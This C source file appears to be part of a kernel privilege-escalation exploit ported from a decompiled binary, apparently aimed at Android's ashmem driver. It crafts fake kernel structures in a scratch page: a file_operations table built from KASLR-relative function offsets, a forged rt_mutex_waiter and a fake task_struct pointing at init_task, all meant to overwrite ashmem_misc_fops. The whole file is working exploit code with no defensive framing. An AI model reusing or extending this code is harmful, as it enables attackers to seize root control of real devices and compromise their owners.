/* source: FUN_00106288 (param_1==0 branch, "install fake ashmem_misc_fops"
 * path) + FUN_001061ac (fake rt_mutex_waiter builder). Straight port of
 * the byte layout, verified field-by-field against the decompile this
 * session -- see fops_install.h for the derivation. */
#include <string.h>

#include "fops_install.h"
#include "target_zzhl.h"

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void put32(unsigned char *base, size_t off, uint32_t value) {
  memcpy(base + off, &value, sizeof(value));
}

int build_reclaimable_dentry_fops_name(
    unsigned char name[DENTRY_FOPS_NAME_SIZE], uint64_t kernel_base) {
  if (!name || !kernel_base) return 0;
  memset(name, 0x52, DENTRY_FOPS_NAME_SIZE);
  uint64_t noop = kernel_base + ZZHL_NOOP_LLSEEK_OFF;
  for (size_t off = 0; off < 0x118; off += 8) put64(name, off, noop);
  put64(name, 0x00, noop);
  put64(name, 0x08, kernel_base + ZZHL_DEFAULT_LLSEEK_OFF);
  put64(name, 0x10, kernel_base + ZZHL_VFS_SETLEASE_OFF);
  put64(name, 0x18, kernel_base + ZZHL_CONFIGFS_READ_ITER_OFF);
  put64(name, 0x20, kernel_base + ZZHL_CONFIGFS_BIN_WRITE_ITER_OFF);
  put64(name, 0x48, kernel_base + ZZHL_ASHMEM_IOCTL_OFF);
  put64(name, 0x50, kernel_base + ZZHL_ASHMEM_COMPAT_IOCTL_OFF);
  put64(name, 0x58, kernel_base + ZZHL_ASHMEM_MMAP_OFF);
  put64(name, 0x68, kernel_base + ZZHL_ASHMEM_OPEN_OFF);
  put64(name, 0x70, kernel_base + ZZHL_ITER_FILE_SPLICE_WRITE_OFF);
  put64(name, 0x78, kernel_base + ZZHL_ASHMEM_RELEASE_OFF);
  put64(name, 0xc0, kernel_base + ZZHL_COPY_SPLICE_READ_OFF);
  put64(name, 0xd8, kernel_base + ZZHL_ASHMEM_SHOW_FDINFO_OFF);
  /* This clone transports the reclaim image as binary AF_UNIX datagram
   * payload. Unlike DiamondFox's pathname-backed lookup helper, neither NUL
   * nor '/' terminates or rejects sendmsg data. Rejecting those bytes made
   * candidate creation depend on the current KASLR slide (for example ZZHL
   * slide 0x1a0000 makes ashmem_* contain byte 0x2f). */
  return 1;
}

/* source: FUN_001061ac @ 0x0010a1ac. w0 = waiter offset (0x2350). */
static void put_fake_waiter(unsigned char *scratch, size_t w0,
                             uint64_t pi_parent, uint64_t pi_right,
                             uint64_t pi_left, uint64_t task, uint64_t lock,
                             uint32_t prio) {
  put64(scratch, w0 + 0x00, 1);           /* tree_entry.parent_color */
  put64(scratch, w0 + 0x08, 0);           /* tree_entry.rb_right */
  put64(scratch, w0 + 0x10, 0);           /* tree_entry.rb_left */
  put64(scratch, w0 + 0x18, pi_parent);   /* pi_tree_entry.parent_color */
  put64(scratch, w0 + 0x20, pi_right);    /* pi_tree_entry.rb_right */
  put64(scratch, w0 + 0x28, pi_left);     /* pi_tree_entry.rb_left */
  put64(scratch, w0 + 0x30, task);        /* task */
  put64(scratch, w0 + 0x38, lock);        /* lock */
  put64(scratch, w0 + 0x40, 0);           /* wake_state (4B, rest zero) */
  put32(scratch, w0 + 0x44, prio);        /* prio */
  put64(scratch, w0 + 0x48, 0);           /* deadline */
  put64(scratch, w0 + 0x50, 0);           /* ww_ctx */
}

/* Fake file_operations table (FOPS_OFF=0x2000). Use individual ZZHL
 * offsets, not deltas from ashmem_ioctl: this makes every callback auditable
 * against the extracted kernel and avoids silently carrying an AFZH3 delta. */
static void put_fake_fops(unsigned char *scratch, uint64_t kernel_base,
                           uint64_t self_ref, size_t table_base) {
  uint64_t configfs_read_iter = kernel_base + ZZHL_CONFIGFS_READ_ITER_OFF;

  put64(scratch, table_base + 0x00, 0);           /* FOPS_OWNER_OFF */
  put64(scratch, table_base + 0x08, self_ref);    /* FOPS_LLSEEK_OFF */
  put64(scratch, table_base + 0x10, 0);           /* FOPS_READ_OFF */
  put64(scratch, table_base + 0x18, 0);           /* FOPS_WRITE_OFF */
  put64(scratch, table_base + 0x20, configfs_read_iter); /* FOPS_READ_ITER_OFF */
  put64(scratch, table_base + 0x28,
        kernel_base + ZZHL_CONFIGFS_BIN_WRITE_ITER_OFF);
  put64(scratch, table_base + 0x50, kernel_base + ZZHL_ASHMEM_IOCTL_OFF);
  put64(scratch, table_base + 0x58,
        kernel_base + ZZHL_ASHMEM_COMPAT_IOCTL_OFF);
  put64(scratch, table_base + 0x60, kernel_base + ZZHL_ASHMEM_MMAP_OFF);
  put64(scratch, table_base + 0x70, kernel_base + ZZHL_ASHMEM_OPEN_OFF);
  put64(scratch, table_base + 0x80, kernel_base + ZZHL_ASHMEM_RELEASE_OFF);
  put64(scratch, table_base + 0xc8,
        kernel_base + ZZHL_COPY_SPLICE_READ_OFF);
  put64(scratch, table_base + 0xe0,
        kernel_base + ZZHL_ASHMEM_SHOW_FDINFO_OFF);
}

/* source: FUN_00106288, fake task_struct (FAKE_TASK_OFF=0x3200). Offsets
 * match target.h's FAKE_TASK_* constants exactly. */
static void put_fake_task(unsigned char *scratch, uint64_t self_ref,
                           uint64_t root_task_group, uint64_t init_task_addr) {
  put32(scratch, 0x3200 + 0x38, 0x100);  /* FAKE_TASK_USAGE_OFF */
  put32(scratch, 0x3200 + 0x7c, 0x78);   /* FAKE_TASK_PRIO_OFF */
  put32(scratch, 0x3200 + 0x84, 0x78);   /* FAKE_TASK_NORMAL_PRIO_OFF */
  put64(scratch, 0x3200 + 0x884, 0);     /* FAKE_TASK_PI_LOCK_OFF */
  put64(scratch, 0x3200 + 0x898, self_ref); /* FAKE_TASK_PI_WAITERS_OFF (rb_root) */
  put64(scratch, 0x3200 + 0x8a0, self_ref); /* pi_waiters.rb_leftmost */
  put64(scratch, 0x3200 + 0x400, root_task_group); /* FAKE_TASK_TASK_GROUP_OFF */
  put64(scratch, 0x3200 + 0x8a8, init_task_addr);  /* FAKE_TASK_PI_TOP_TASK_OFF */
  put64(scratch, 0x3200 + 0x8b0, 0);     /* FAKE_TASK_PI_BLOCKED_ON_OFF */
}

void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
                                uint64_t kernel_base,
                                uint64_t ashmem_misc_fops_addr,
                                uint64_t init_task_addr) {
  memset(scratch, 0, FOPS_INSTALL_PAGE_SIZE);

  uint64_t lock_waiters_self_ref = aligned_base | 0x14d0ULL;
  uint64_t pi_waiters_self_ref = aligned_base | 0x14e8ULL;
  uint64_t pi_parent = aligned_base | 0x1180ULL;
  uint64_t waiter_lock = aligned_base | 0x1390ULL;
  uint64_t root_task_group = kernel_base + ZZHL_ROOT_TASK_GROUP_OFF;

  put64(scratch, 0x2210, 0);                    /* lock.wait_lock = 0 */
  put64(scratch, 0x2218, lock_waiters_self_ref); /* lock.waiters.rb_root */
  put64(scratch, 0x2220, lock_waiters_self_ref); /* lock.waiters.rb_leftmost */
  put64(scratch, 0x2228, 1);                     /* lock.owner = 1 (SLIDE_LOCK_OWNER-equivalent slot) */

  put_fake_waiter(scratch, 0x2350, pi_parent, ashmem_misc_fops_addr, 0,
                  init_task_addr, waiter_lock, 0x82);

  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref, 0x2000);
  put_fake_task(scratch, pi_waiters_self_ref, root_task_group, init_task_addr);

  /* RIGHT_OFF / LEFT_OFF: two more fake rb_node objects, both parented
   * back at pi_parent (aligned_base|0x1180) -- same value used above for
   * the waiter's pi_tree_entry.parent_color. */
  put64(scratch, 0x4440, pi_parent);
  put64(scratch, 0x4448, 0);
  put64(scratch, 0x4450, 0);
  put64(scratch, 0x5550, pi_parent);
  put64(scratch, 0x5558, 0);
  put64(scratch, 0x5560, 0);

}
